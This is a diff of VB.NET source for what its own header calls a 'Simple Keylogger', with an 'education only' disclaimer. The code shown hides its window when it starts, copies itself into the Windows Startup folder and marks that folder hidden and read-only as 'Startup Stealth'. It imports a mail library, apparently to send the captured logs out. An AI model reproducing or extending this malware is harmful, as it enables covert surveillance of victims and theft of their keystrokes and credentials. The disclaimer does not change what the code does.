@@ -1,4 +1,7 @@
-﻿Imports System.Web
+﻿'Simple Keylogger Coded By PhilipMo@TeamH4C
+'DO NOT ABUSE
+'JUST USE FOR EDUCATION
+Imports System.Web
 Imports System.IO
 Imports System.Net.Mail
 Public Class Form1
@@ -7,8 +10,8 @@ Public Class Form1
     Dim strin As String = Nothing
     Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
     Dim AppPath As String = Application.ExecutablePath
-    Dim AutoStart As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "/" & IO.Path.GetFileName(AppPath)     'Needed for statrup
-    Dim HideFile As IO.FileInfo = My.Computer.FileSystem.GetFileInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup))   'Needed for startup
+    Dim AutoStart As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "/" & IO.Path.GetFileName(AppPath)
+    Dim HideFile As IO.FileInfo = My.Computer.FileSystem.GetFileInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
     Private Function GetActiveWindowTitle() As String
         Dim MyStr As String
         MyStr = New String(Chr(0), 100)
@@ -20,7 +23,7 @@ Public Class Form1
 
     Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
         Me.Hide()
-        Try
+        Try ' Startup Stealth
             IO.File.Copy(AppPath, AutoStart)
             HideFile.IsReadOnly = True
             HideFile.Attributes = HideFile.Attributes Or IO.FileAttributes.Hidden
